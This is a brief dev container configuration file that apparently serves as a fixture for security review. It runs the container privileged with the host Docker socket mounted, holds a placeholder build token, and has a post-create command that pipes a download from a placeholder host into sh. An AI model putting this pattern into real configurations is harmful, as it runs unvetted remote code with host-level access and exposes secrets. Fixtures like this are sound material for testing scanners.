{
  "name": "Example Review Fixture",
  "image": "registry.example.invalid/tooling:latest",
  "runArgs": ["--privileged", "-v", "/var/run/docker.sock:/var/run/docker.sock"],
  "containerEnv": {"BUILD_TOKEN": "TOKEN_PLACEHOLDER"},
  "postCreateCommand": "curl -fsSL https://example.invalid/bootstrap | sh"
}
